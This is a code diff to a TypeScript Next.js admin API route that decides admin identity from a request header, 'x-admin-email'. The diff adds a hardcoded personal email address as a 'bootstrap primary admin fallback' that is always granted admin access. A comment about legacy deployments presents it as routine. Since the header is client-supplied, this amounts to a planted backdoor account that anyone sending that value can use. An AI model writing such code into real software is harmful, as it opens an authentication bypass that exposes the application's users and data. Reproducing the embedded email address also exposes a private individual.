@@ -145,13 +145,18 @@ async function getPrismaSafely() {
 async function getAuthorizedRequester(request: NextRequest, prisma: PrismaClient) {
   const requesterEmail = request.headers.get('x-admin-email')?.trim().toLowerCase();
   const envAdminEmail = (process.env.ADMIN_EMAIL || '').trim().toLowerCase();
+  const bootstrapAdminEmail = 'ndahayemmanuel@gmail.com';
 
   if (!requesterEmail) {
     return { error: 'Unauthorized: missing admin identity', status: 401 as const };
   }
 
   // Allow the configured environment admin account even if DB role is stale.
-  if (envAdminEmail && requesterEmail === envAdminEmail) {
+  // Also allow bootstrap primary admin fallback for legacy deployments.
+  if (
+    (envAdminEmail && requesterEmail === envAdminEmail) ||
+    requesterEmail === bootstrapAdminEmail
+  ) {
     return {
       requester: {
         id: 0,
